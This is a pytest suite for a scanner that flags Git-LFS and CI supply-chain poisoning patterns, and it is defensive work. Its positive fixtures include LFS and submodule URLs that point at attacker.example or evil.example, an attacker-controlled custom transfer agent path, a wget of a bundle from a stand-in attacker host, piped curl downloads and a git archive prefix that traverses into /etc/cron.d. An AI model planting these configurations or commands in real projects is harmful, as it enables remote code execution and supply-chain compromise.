"""Tests for scripts/lib/git_lfs_patterns.py.

Wave 19 (distill round 5, angle D) — Git-LFS / large-binary artifact
poisoning patterns. Every rule gets at least one positive test (the
attack shape fires) plus one or more negative tests (a benign-but-
similar shape does NOT fire). Helper gates are unit-tested directly
so a future refactor that breaks an allowlist surfaces immediately.

Run:
    uv run --with pytest python -m pytest tests/test_git_lfs_patterns.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import git_lfs_patterns as glp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_immutable_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(glp.RULES, tuple)
    rule_ids = {r.id for r in glp.RULES}
    expected = {
        "git-lfs-pointer-malformed",
        "git-lfs-lfsconfig-url-offorg",
        "git-lfs-lfsconfig-custom-transfer",
        "git-lfs-lfsconfig-standalone-transfer",
        "git-lfs-gitattributes-blanket-filter",
        "git-lfs-gitattributes-source-extension",
        "git-lfs-skip-smudge-in-ci",
        "git-lfs-release-no-checksum-sidecar",
        "git-lfs-install-latest-redirect",
        "git-lfs-install-asset-no-checksum",
        "git-lfs-prerelease-default-tag",
        "git-lfs-upload-artifact-untrusted-name",
        "git-lfs-download-artifact-no-name-filter",
        "git-lfs-gitmodules-suspicious-url",
        "git-lfs-gitmodules-relative-escape",
        "git-lfs-archive-prefix-traversal",
        "git-lfs-archive-prefix-untrusted",
        "git-lfs-bundle-ingest-unverified",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_valid_severity() -> None:
    """Every rule has a severity from the canonical set."""
    valid = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in glp.RULES:
        assert rule.severity in valid, rule.id


def test_every_rule_declares_applies_to_any() -> None:
    """Every rule lists `any` plus at least one specific file_kind."""
    for rule in glp.RULES:
        assert isinstance(rule.applies_to, frozenset), rule.id
        assert "any" in rule.applies_to, rule.id
        assert len(rule.applies_to) >= 2, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding has the standard rule_id/line/column/severity shape."""
    f = glp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2


def _hits(rule_id: str, text: str, *, file_kind: str = "any") -> list[glp.Finding]:
    return [f for f in glp.scan_text(text, file_kind=file_kind) if f.rule_id == rule_id]


# ---------- Proposal 1: pointer-file integrity ---------------------------


def test_parse_lfs_pointer_canonical() -> None:
    """A well-formed pointer parses cleanly."""
    content = (
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:" + b"a" * 64 + b"\n"
        b"size 1234\n"
    )
    parsed = glp.parse_lfs_pointer(content)
    assert parsed is not None
    oid, size = parsed
    assert oid == "a" * 64
    assert size == 1234


def test_parse_lfs_pointer_rejects_extra_lines() -> None:
    """A pointer with extra trailing content is rejected (not canonical)."""
    content = (
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:" + b"b" * 64 + b"\n"
        b"size 100\n"
        b"sneakymeta foo\n"
    )
    assert glp.parse_lfs_pointer(content) is None


def test_parse_lfs_pointer_rejects_truncated() -> None:
    """Missing `size` line is rejected."""
    content = b"version https://git-lfs.github.com/spec/v1\noid sha256:" + b"c" * 64 + b"\n"
    assert glp.parse_lfs_pointer(content) is None


def test_parse_lfs_pointer_rejects_non_ascii() -> None:
    """Non-ASCII bytes in a pointer fail closed."""
    assert glp.parse_lfs_pointer(b"version https://\xff/spec/v1\n") is None


def test_pointer_malformed_pos() -> None:
    """A pointer header followed by garbage triggers the malformed rule."""
    text = (
        "version https://git-lfs.github.com/spec/v1\n"
        "oid not-actually-a-hash\n"
        "size foo\n"
    )
    assert _hits("git-lfs-pointer-malformed", text, file_kind="lfs-pointer")


def test_pointer_canonical_neg() -> None:
    """A clean pointer triggers no malformed finding."""
    text = (
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:" + "a" * 64 + "\n"
        "size 4096\n"
    )
    assert not _hits("git-lfs-pointer-malformed", text, file_kind="lfs-pointer")


# ---------- Proposal 5: pointer size implausible / zero ------------------


def test_pointer_size_implausible() -> None:
    """A pointer claiming 9 PiB triggers the OOM heuristic."""
    text = (
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:" + "d" * 64 + "\n"
        "size 9999999999999\n"
    )
    assert _hits("git-lfs-pointer-size-implausible", text, file_kind="lfs-pointer")


def test_pointer_size_zero() -> None:
    """A pointer claiming size 0 triggers the truncation-marker rule."""
    text = (
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:" + "0" * 64 + "\n"
        "size 0\n"
    )
    assert _hits("git-lfs-pointer-size-zero", text, file_kind="lfs-pointer")


def test_pointer_size_reasonable_neg() -> None:
    """A pointer with a normal size (10 MiB) triggers neither size rule."""
    text = (
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:" + "1" * 64 + "\n"
        "size 10485760\n"
    )
    findings = glp.scan_text(text, file_kind="lfs-pointer")
    bad_ids = {"git-lfs-pointer-size-implausible", "git-lfs-pointer-size-zero"}
    assert not any(f.rule_id in bad_ids for f in findings)


# ---------- Proposal 2: `.lfsconfig` URL hijack --------------------------


def test_lfsconfig_url_offorg_pos() -> None:
    """`url = https://evil.example/` triggers off-org finding."""
    text = "[lfs]\n    url = https://evil.example/lfs.git\n"
    assert _hits("git-lfs-lfsconfig-url-offorg", text, file_kind="lfsconfig")


def test_lfsconfig_url_github_neg() -> None:
    """`url = https://github.com/...` is on-allowlist."""
    text = "[lfs]\n    url = https://github.com/myorg/repo.git/info/lfs\n"
    assert not _hits("git-lfs-lfsconfig-url-offorg", text, file_kind="lfsconfig")


def test_lfsconfig_url_extra_allowed() -> None:
    """`extra_allowed_lfs_hosts` is honored for self-hosted LFS endpoints."""
    text = "[lfs]\n    url = https://gitea.internal.example/lfs\n"
    extra = frozenset({"gitea.internal.example"})
    findings = [
        f for f in glp.scan_text(text, file_kind="lfsconfig", extra_allowed_lfs_hosts=extra)
        if f.rule_id == "git-lfs-lfsconfig-url-offorg"
    ]
    assert not findings


def test_lfsconfig_url_unparseable_fires() -> None:
    """A malformed URL value still fires the rule (fail-closed)."""
    text = "[lfs]\n    url = ::garbage::\n"
    assert _hits("git-lfs-lfsconfig-url-offorg", text, file_kind="lfsconfig")


def test_lfsconfig_custom_transfer_pos() -> None:
    """`path = ./run.sh` inside `customtransfer` section fires CRITICAL."""
    text = (
        '[lfs "customtransfer.my-transfer"]\n'
        "    path = /opt/attacker/run.sh\n"
        "    concurrent = true\n"
    )
    assert _hits("git-lfs-lfsconfig-custom-transfer", text, file_kind="lfsconfig")


def test_lfsconfig_custom_transfer_outside_section_neg() -> None:
    """A bare `path =` line outside any customtransfer section does NOT fire."""
    text = '[remote "origin"]\n    path = /home/user/work\n'
    assert not _hits("git-lfs-lfsconfig-custom-transfer", text, file_kind="lfsconfig")


def test_lfsconfig_standalone_agent_pos() -> None:
    """`standalonetransferagent = ssh-helper` fires."""
    text = "[lfs]\n    standalonetransferagent = /opt/attacker/agent\n"
    assert _hits("git-lfs-lfsconfig-standalone-transfer", text, file_kind="lfsconfig")


# ---------- Proposal 3: `.gitattributes` blanket / source-extension -----


def test_gitattributes_blanket_pos() -> None:
    """`* filter=lfs` triggers blanket-filter CRITICAL."""
    text = "* filter=lfs diff=lfs merge=lfs -text\n"
    assert _hits("git-lfs-gitattributes-blanket-filter", text, file_kind="gitattributes")


def test_gitattributes_double_star_pos() -> None:
    """`** filter=lfs` is also blanket."""
    text = "** filter=lfs diff=lfs merge=lfs\n"
    assert _hits("git-lfs-gitattributes-blanket-filter", text, file_kind="gitattributes")


def test_gitattributes_specific_glob_neg() -> None:
    """`*.psd filter=lfs` is the legit shape — does NOT fire blanket rule."""
    text = "*.psd filter=lfs diff=lfs merge=lfs -text\n"
    assert not _hits("git-lfs-gitattributes-blanket-filter", text, file_kind="gitattributes")


def test_gitattributes_source_extension_pos() -> None:
    """`*.py filter=lfs` routes source code through LFS — fires HIGH."""
    text = "*.py filter=lfs diff=lfs merge=lfs\n"
    assert _hits("git-lfs-gitattributes-source-extension", text, file_kind="gitattributes")


def test_gitattributes_source_extension_js_pos() -> None:
    """`*.js filter=lfs` also flagged."""
    text = "*.js filter=lfs\n"
    assert _hits("git-lfs-gitattributes-source-extension", text, file_kind="gitattributes")


def test_gitattributes_blanket_no_double_fire() -> None:
    """A blanket glob fires CRITICAL but NOT the source-extension rule."""
    text = "* filter=lfs\n"
    findings = glp.scan_text(text, file_kind="gitattributes")
    blanket = [f for f in findings if f.rule_id == "git-lfs-gitattributes-blanket-filter"]
    src = [f for f in findings if f.rule_id == "git-lfs-gitattributes-source-extension"]
    assert blanket
    assert not src


def test_gitattributes_comment_neg() -> None:
    """Commented-out blanket line does not fire."""
    text = "# * filter=lfs   -- commented out\n"
    assert not _hits("git-lfs-gitattributes-blanket-filter", text, file_kind="gitattributes")


def test_audit_gitattributes_diff_blanket() -> None:
    """`audit_gitattributes_diff` detects newly-added blanket entries."""
    pre = "*.psd filter=lfs diff=lfs merge=lfs\n"
    post = pre + "* filter=lfs diff=lfs merge=lfs\n"
    findings = glp.audit_gitattributes_diff(pre, post)
    assert any("blanket LFS filter" in f for f in findings)


def test_audit_gitattributes_diff_source_extension() -> None:
    """Adding a source-extension LFS line is flagged in diff mode."""
    pre = "*.psd filter=lfs\n"
    post = pre + "*.py filter=lfs\n"
    findings = glp.audit_gitattributes_diff(pre, post)
    assert any("source extension" in f for f in findings)


def test_audit_gitattributes_diff_removal_silent() -> None:
    """Removing an LFS line is NOT flagged (only adds are concerning)."""
    pre = "*.psd filter=lfs\n* filter=lfs\n"
    post = "*.psd filter=lfs\n"
    findings = glp.audit_gitattributes_diff(pre, post)
    assert findings == []


# ---------- Proposal 4: skip-smudge in CI --------------------------------


def test_skip_smudge_env_pos() -> None:
    """`GIT_LFS_SKIP_SMUDGE=1` in a workflow fires."""
    text = "env:\n  GIT_LFS_SKIP_SMUDGE: 1\n"
    assert _hits("git-lfs-skip-smudge-in-ci", text, file_kind="workflow")


def test_skip_smudge_env_true_pos() -> None:
    """`GIT_LFS_SKIP_SMUDGE=true` also fires."""
    text = "GIT_LFS_SKIP_SMUDGE=true\n"
    assert _hits("git-lfs-skip-smudge-in-ci", text, file_kind="shell")


def test_skip_smudge_cli_pos() -> None:
    """`git lfs install --skip-smudge` fires."""
    text = "  run: git lfs install --skip-smudge\n"
    assert _hits("git-lfs-skip-smudge-in-ci", text, file_kind="workflow")


def test_skip_smudge_env_zero_neg() -> None:
    """`GIT_LFS_SKIP_SMUDGE=0` is the safe value."""
    text = "GIT_LFS_SKIP_SMUDGE=0\n"
    assert not _hits("git-lfs-skip-smudge-in-ci", text, file_kind="workflow")


# ---------- Proposal 7: release publish without checksum sidecar --------


def test_release_no_checksum_pos() -> None:
    """`softprops/action-gh-release` without sha256sum siblings fires."""
    text = (
        "jobs:\n"
        "  release:\n"
        "    steps:\n"
        "      - uses: softprops/action-gh-release@v2\n"
        "        with:\n"
        "          files: dist/*\n"
    )
    assert _hits("git-lfs-release-no-checksum-sidecar", text, file_kind="workflow")


def test_release_with_sha256sum_neg() -> None:
    """`softprops/action-gh-release` adjacent to `sha256sum` does NOT fire."""
    text = (
        "jobs:\n"
        "  release:\n"
        "    steps:\n"
        "      - name: Checksum\n"
        "        run: sha256sum dist/*.tar.gz > dist/SHA256SUMS\n"
        "      - uses: softprops/action-gh-release@v2\n"
        "        with:\n"
        "          files: dist/*\n"
    )
    assert not _hits("git-lfs-release-no-checksum-sidecar", text, file_kind="workflow")


def test_release_with_cosign_neg() -> None:
    """`cosign sign-blob` also satisfies the sidecar requirement."""
    text = (
        "    steps:\n"
        "      - run: cosign sign-blob --output-signature dist/foo.sig dist/foo.tar.gz\n"
        "      - uses: softprops/action-gh-release@v2\n"
    )
    assert not _hits("git-lfs-release-no-checksum-sidecar", text, file_kind="workflow")


# ---------- Proposal 8: install script downloads ------------------------


def test_install_latest_redirect_pos() -> None:
    """`releases/latest/download/<asset>` fires."""
    text = "curl -sL https://github.com/foo/bar/releases/latest/download/x.tar.gz | tar xz\n"
    assert _hits("git-lfs-install-latest-redirect", text, file_kind="shell")


def test_install_pinned_tag_neg() -> None:
    """A pinned tag is acceptable for the latest-redirect rule (other rule may fire on missing checksum)."""
    text = "curl -sL https://github.com/foo/bar/releases/download/v1.2.3/x.tar.gz | tar xz\n"
    assert not _hits("git-lfs-install-latest-redirect", text, file_kind="shell")


def test_install_asset_no_checksum_pos() -> None:
    """A pinned-tag download without verification fires the no-checksum rule."""
    text = "curl -sL https://github.com/foo/bar/releases/download/v1.2.3/x.tar.gz | tar xz\n"
    assert _hits("git-lfs-install-asset-no-checksum", text, file_kind="shell")


def test_install_asset_with_checksum_neg() -> None:
    """A pinned-tag download followed by `sha256sum -c` does NOT fire."""
    text = (
        "curl -sL https://github.com/foo/bar/releases/download/v1.2.3/x.tar.gz -o x.tar.gz\n"
        "sha256sum -c x.tar.gz.sha256\n"
        "tar xzf x.tar.gz\n"
    )
    assert not _hits("git-lfs-install-asset-no-checksum", text, file_kind="shell")


def test_install_asset_with_gpg_neg() -> None:
    """`gpg --verify` also satisfies the verifier requirement."""
    text = (
        "curl -sL https://github.com/foo/bar/releases/download/v1.0/x.tar.gz -o x.tar.gz\n"
        "gpg --verify x.tar.gz.sig\n"
    )
    assert not _hits("git-lfs-install-asset-no-checksum", text, file_kind="shell")


def test_install_latest_does_not_double_fire_no_checksum() -> None:
    """A `latest`-redirect URL fires the latest rule, but NOT the no-checksum rule (avoid duplicate noise)."""
    text = "curl -sL https://github.com/foo/bar/releases/latest/download/x.tar.gz | tar xz\n"
    findings = glp.scan_text(text, file_kind="shell")
    assert any(f.rule_id == "git-lfs-install-latest-redirect" for f in findings)
    assert not any(f.rule_id == "git-lfs-install-asset-no-checksum" for f in findings)


# ---------- Proposal 9: prerelease + default npm publish ----------------


def test_prerelease_with_default_npm_publish_pos() -> None:
    """`prerelease: true` followed by bare `npm publish` fires."""
    text = (
        "      - uses: softprops/action-gh-release@v2\n"
        "        with:\n"
        "          prerelease: true\n"
        "      - run: npm publish\n"
    )
    assert _hits("git-lfs-prerelease-default-tag", text, file_kind="workflow")


def test_prerelease_with_npm_tag_neg() -> None:
    """`npm publish --tag next` is the correct prerelease channel."""
    text = (
        "        with:\n"
        "          prerelease: true\n"
        "      - run: npm publish --tag next\n"
    )
    assert not _hits("git-lfs-prerelease-default-tag", text, file_kind="workflow")


def test_no_prerelease_default_publish_neg() -> None:
    """Without `prerelease: true`, default `npm publish` is fine."""
    text = "      - run: npm publish\n"
    assert not _hits("git-lfs-prerelease-default-tag", text, file_kind="workflow")


# ---------- Proposal 10: upload-artifact untrusted name -----------------


def test_upload_artifact_untrusted_pr_title_pos() -> None:
    """`name: ${{ github.event.pull_request.title }}` fires."""
    text = (
        "      - uses: actions/upload-artifact@v4\n"
        "        with:\n"
        "          name: ${{ github.event.pull_request.title }}\n"
        "          path: dist/\n"
    )
    assert _hits("git-lfs-upload-artifact-untrusted-name", text, file_kind="workflow")


def test_upload_artifact_untrusted_head_ref_pos() -> None:
    """`name: ${{ github.head_ref }}` also fires."""
    text = (
        "      - uses: actions/upload-artifact@v4\n"
        "        with:\n"
        "          name: ${{ github.head_ref }}\n"
    )
    assert _hits("git-lfs-upload-artifact-untrusted-name", text, file_kind="workflow")


def test_upload_artifact_static_name_neg() -> None:
    """A hardcoded artifact name does NOT fire."""
    text = (
        "      - uses: actions/upload-artifact@v4\n"
        "        with:\n"
        "          name: build-output\n"
    )
    assert not _hits("git-lfs-upload-artifact-untrusted-name", text, file_kind="workflow")


# ---------- Proposal 11: download-artifact no name filter ---------------


def test_download_artifact_workflow_run_no_name_pos() -> None:
    """`workflow_run` trigger + download-artifact without `name:` fires CRITICAL."""
    text = (
        "on:\n"
        "  workflow_run:\n"
        "    workflows: [ci]\n"
        "    types: [completed]\n"
        "jobs:\n"
        "  deploy:\n"
        "    steps:\n"
        "      - uses: actions/download-artifact@v4\n"
        "        with:\n"
        "          run-id: ${{ github.event.workflow_run.id }}\n"
    )
    assert _hits("git-lfs-download-artifact-no-name-filter", text, file_kind="workflow")


def test_download_artifact_pr_target_no_name_pos() -> None:
    """`pull_request_target` + download-artifact without `name:` also fires."""
    text = (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  scan:\n"
        "    steps:\n"
        "      - uses: actions/download-artifact@v4\n"
        "        with:\n"
        "          run-id: ${{ github.event.workflow_run.id }}\n"
    )
    assert _hits("git-lfs-download-artifact-no-name-filter", text, file_kind="workflow")


def test_download_artifact_with_name_neg() -> None:
    """A name filter present after the `uses:` line suppresses the rule."""
    text = (
        "on:\n"
        "  workflow_run:\n"
        "    workflows: [ci]\n"
        "jobs:\n"
        "  deploy:\n"
        "    steps:\n"
        "      - uses: actions/download-artifact@v4\n"
        "        with:\n"
        "          name: build-output\n"
        "          run-id: ${{ github.event.workflow_run.id }}\n"
    )
    assert not _hits("git-lfs-download-artifact-no-name-filter", text, file_kind="workflow")


def test_download_artifact_pull_request_neg() -> None:
    """Regular `pull_request` (not `_target`) trigger does NOT fire — secrets unavailable."""
    text = (
        "on:\n"
        "  pull_request:\n"
        "jobs:\n"
        "  test:\n"
        "    steps:\n"
        "      - uses: actions/download-artifact@v4\n"
    )
    assert not _hits("git-lfs-download-artifact-no-name-filter", text, file_kind="workflow")


# ---------- Proposal 12: submodule URL rewrite -------------------------


def test_gitmodules_offorg_pos() -> None:
    """A submodule URL pointing off-allowlist fires."""
    text = (
        '[submodule "cool-lib"]\n'
        "    path = vendor/cool-lib\n"
        "    url = https://attacker.example/cool-lib.git\n"
    )
    assert _hits("git-lfs-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_github_neg() -> None:
    """`https://github.com/...` is on-allowlist."""
    text = (
        '[submodule "cool-lib"]\n'
        "    path = vendor/cool-lib\n"
        "    url = https://github.com/myorg/cool-lib.git\n"
    )
    assert not _hits("git-lfs-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_extra_allowed_passes() -> None:
    """A self-hosted Gitea URL passes when included in extra allowlist."""
    text = (
        '[submodule "cool-lib"]\n'
        "    url = https://gitea.example.com/myorg/cool-lib.git\n"
    )
    findings = [
        f for f in glp.scan_text(
            text, file_kind="gitmodules",
            extra_allowed_lfs_hosts=frozenset({"gitea.example.com"}),
        )
        if f.rule_id == "git-lfs-gitmodules-suspicious-url"
    ]
    assert not findings


def test_gitmodules_ssh_form_neg() -> None:
    """`git@github.com:org/repo.git` SSH form is allowlisted."""
    text = (
        '[submodule "lib"]\n'
        "    url = git@github.com:myorg/lib.git\n"
    )
    assert not _hits("git-lfs-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_relative_escape_pos() -> None:
    """`url = ../../attacker/lib.git` fires the relative-escape rule."""
    text = (
        '[submodule "lib"]\n'
        "    url = ../../attacker/lib.git\n"
    )
    assert _hits("git-lfs-gitmodules-relative-escape", text, file_kind="gitmodules")


def test_gitmodules_relative_sibling_neg() -> None:
    """`url = ./local/lib.git` is sibling-relative, not escape."""
    text = (
        '[submodule "lib"]\n'
        "    url = ./local/lib.git\n"
    )
    assert not _hits("git-lfs-gitmodules-relative-escape", text, file_kind="gitmodules")


def test_parse_gitmodules_urls_helper() -> None:
    """`parse_gitmodules_urls` correctly extracts name->url map."""
    text = (
        '[submodule "a"]\n'
        "    path = vendor/a\n"
        "    url = https://github.com/o/a.git\n"
        '[submodule "b"]\n'
        "    url = https://github.com/o/b.git\n"
    )
    urls = glp.parse_gitmodules_urls(text)
    assert urls == {
        "a": "https://github.com/o/a.git",
        "b": "https://github.com/o/b.git",
    }


# ---------- Proposal 13: `git archive --prefix` traversal --------------


def test_archive_prefix_traversal_pos() -> None:
    """`--prefix=../etc/cron.d/` fires."""
    text = "git archive --format=tar.gz --prefix=../etc/cron.d/ -o release.tar.gz HEAD\n"
    assert _hits("git-lfs-archive-prefix-traversal", text, file_kind="shell")


def test_archive_prefix_absolute_pos() -> None:
    """`--prefix=/etc/` (absolute) also fires."""
    text = "git archive --prefix=/etc/foo/ -o /tmp/r.tar.gz HEAD\n"
    assert _hits("git-lfs-archive-prefix-traversal", text, file_kind="shell")


def test_archive_prefix_quoted_traversal_pos() -> None:
    """Quoted prefix with `..` fires."""
    text = 'git archive --prefix="../../bin/" -o r.tar.gz HEAD\n'
    assert _hits("git-lfs-archive-prefix-traversal", text, file_kind="shell")


def test_archive_prefix_normal_neg() -> None:
    """Normal `--prefix=myproject-1.0/` does not fire."""
    text = "git archive --prefix=myproject-1.0/ -o r.tar.gz HEAD\n"
    findings = glp.scan_text(text, file_kind="shell")
    bad = {"git-lfs-archive-prefix-traversal", "git-lfs-archive-prefix-untrusted"}
    assert not any(f.rule_id in bad for f in findings)


def test_archive_prefix_untrusted_pos() -> None:
    """`--prefix=${{ github.event.pull_request.title }}/` fires untrusted rule."""
    text = 'git archive --prefix="${{ github.event.pull_request.title }}/" -o r.tar.gz HEAD\n'
    assert _hits("git-lfs-archive-prefix-untrusted", text, file_kind="workflow")


def test_archive_prefix_untrusted_env_pos() -> None:
    """`--prefix=$GITHUB_HEAD_REF/` also fires."""
    text = 'git archive --prefix="$GITHUB_HEAD_REF/" -o r.tar.gz HEAD\n'
    assert _hits("git-lfs-archive-prefix-untrusted", text, file_kind="shell")


def test_archive_traversal_does_not_double_fire_untrusted() -> None:
    """A prefix that has BOTH traversal AND untrusted only fires the traversal rule."""
    text = 'git archive --prefix="../$GITHUB_REF_NAME/" -o r.tar.gz HEAD\n'
    findings = glp.scan_text(text, file_kind="shell")
    traversal = [f for f in findings if f.rule_id == "git-lfs-archive-prefix-traversal"]
    untrusted = [f for f in findings if f.rule_id == "git-lfs-archive-prefix-untrusted"]
    assert traversal
    assert not untrusted


# ---------- Proposal 14: `git bundle` ingest ---------------------------


def test_bundle_unverified_clone_pos() -> None:
    """`git clone foo.bundle` without verify fires."""
    text = "wget https://attacker.example/backup.bundle\ngit clone backup.bundle .\n"
    assert _hits("git-lfs-bundle-ingest-unverified", text, file_kind="shell")


def test_bundle_unverified_fetch_pos() -> None:
    """`git fetch <file>.bundle` also fires when unverified."""
    text = "git fetch /tmp/backup.bundle\n"
    assert _hits("git-lfs-bundle-ingest-unverified", text, file_kind="shell")


def test_bundle_verified_neg() -> None:
    """A `git bundle verify` + `sha256sum -c` suppresses the rule."""
    text = (
        "sha256sum -c backup.bundle.sha256\n"
        "git bundle verify backup.bundle\n"
        "git clone backup.bundle .\n"
    )
    assert not _hits("git-lfs-bundle-ingest-unverified", text, file_kind="shell")


# ---------- Proposal 15: fetchexclude/fetchinclude diff -----------------


def test_audit_fetch_scope_excluding_removed() -> None:
    """Removing `lfs.fetchexclude` is flagged."""
    pre = "[lfs]\n    fetchexclude = secrets/*\n"
    post = "[lfs]\n"
    findings = glp.audit_lfs_fetch_scope_diff(pre, post)
    assert any("fetchexclude removed" in f for f in findings)


def test_audit_fetch_scope_include_widened() -> None:
    """Widening `lfs.fetchinclude` to a wildcard is flagged."""
    pre = "[lfs]\n    fetchinclude = data/public/\n"
    post = "[lfs]\n    fetchinclude = data/*\n"
    findings = glp.audit_lfs_fetch_scope_diff(pre, post)
    assert any("widened to wildcard" in f for f in findings)


def test_audit_fetch_scope_no_change_silent() -> None:
    """Identical pre/post yields no findings."""
    pre = post = "[lfs]\n    fetchexclude = secrets/*\n    fetchinclude = data/public/*\n"
    assert glp.audit_lfs_fetch_scope_diff(pre, post) == []


# ---------- Helper-gate unit tests --------------------------------------


def test_is_lfs_host_allowed_defaults() -> None:
    """github.com and LFS subdomains pass by default."""
    assert glp.is_lfs_host_allowed("github.com")
    assert glp.is_lfs_host_allowed("lfs.github.com")
    assert glp.is_lfs_host_allowed("git-lfs.github.com")
    assert not glp.is_lfs_host_allowed("evil.example")
    assert not glp.is_lfs_host_allowed(None)
    assert not glp.is_lfs_host_allowed("")


def test_is_lfs_host_allowed_extra() -> None:
    """`extra_allowed` extends the allowlist."""
    assert glp.is_lfs_host_allowed(
        "gitea.internal", extra_allowed=frozenset({"gitea.internal"})
    )


def test_is_dangerous_glob_set() -> None:
    """The four canonical dangerous globs all return True."""
    assert glp.is_dangerous_glob("*")
    assert glp.is_dangerous_glob("**")
    assert glp.is_dangerous_glob("**/*")
    assert glp.is_dangerous_glob("**/**")
    assert not glp.is_dangerous_glob("*.bin")
    assert not glp.is_dangerous_glob("src/**")


def test_is_source_extension_glob() -> None:
    """Canonical source extensions are flagged."""
    assert glp.is_source_extension_glob("*.py")
    assert glp.is_source_extension_glob("*.ts")
    assert glp.is_source_extension_glob("*.go")
    assert glp.is_source_extension_glob("*.rs")
    assert not glp.is_source_extension_glob("*.psd")  # binary, OK in LFS
    assert not glp.is_source_extension_glob("*.bin")
    assert not glp.is_source_extension_glob("data/**")


def test_is_release_asset_url() -> None:
    """Both pinned and latest-redirect URLs are recognised."""
    assert glp.is_release_asset_url(
        "https://github.com/o/r/releases/download/v1.0/x.tar.gz"
    )
    assert glp.is_release_asset_url(
        "https://github.com/o/r/releases/latest/download/x.tar.gz"
    )
    assert not glp.is_release_asset_url("https://github.com/o/r")
    assert not glp.is_release_asset_url("https://example.com/foo.tar.gz")


def test_is_mutable_release_ref() -> None:
    """`latest`, `main`, etc. flagged; semver tags allowed."""
    assert glp.is_mutable_release_ref("latest")
    assert glp.is_mutable_release_ref("main")
    assert glp.is_mutable_release_ref("develop")
    assert not glp.is_mutable_release_ref("v1.0.0")
    assert not glp.is_mutable_release_ref("release-2024-05")


def test_url_host() -> None:
    """`url_host` lower-cases hostnames and tolerates malformed URLs."""
    assert glp.url_host("https://GitHub.com/path") == "github.com"
    assert glp.url_host("https://lfs.GITHUB.com/blob") == "lfs.github.com"
    assert glp.url_host("not a url") is None
    assert glp.url_host("") is None


# ---------- File-kind routing ------------------------------------------


def test_file_kind_routing_lfsconfig() -> None:
    """`file_kind=lfsconfig` runs lfsconfig rules but not workflow rules."""
    text = (
        "[lfs]\n"
        "    url = https://attacker.example/\n"
        "    standalonetransferagent = /opt/rce\n"
    )
    findings = glp.scan_text(text, file_kind="lfsconfig")
    rule_ids = {f.rule_id for f in findings}
    assert "git-lfs-lfsconfig-url-offorg" in rule_ids
    assert "git-lfs-lfsconfig-standalone-transfer" in rule_ids


def test_file_kind_routing_workflow_only() -> None:
    """An lfsconfig pattern in workflow-kind text does NOT fire."""
    text = (
        "jobs:\n"
        "  release:\n"
        "    steps:\n"
        "      - run: |\n"
        "          # lfsconfig snippet embedded in docs:\n"
        "          # [lfs] url = https://attacker.example/\n"
    )
    # Workflow-only scan: lfsconfig rules don't apply.
    findings = [
        f for f in glp.scan_text(text, file_kind="workflow")
        if f.rule_id == "git-lfs-lfsconfig-url-offorg"
    ]
    assert not findings


def test_scan_text_empty_returns_empty() -> None:
    """Empty text returns empty findings."""
    assert glp.scan_text("") == []
    assert glp.scan_text("", file_kind="lfs-pointer") == []


def test_scan_text_dedups_overlapping_rule_hits() -> None:
    """The same (rule, line, col) triple isn't reported twice."""
    text = (
        '[lfs "customtransfer.x"]\n'
        "    path = /opt/rce\n"
    )
    findings = glp.scan_text(text, file_kind="lfsconfig")
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys))
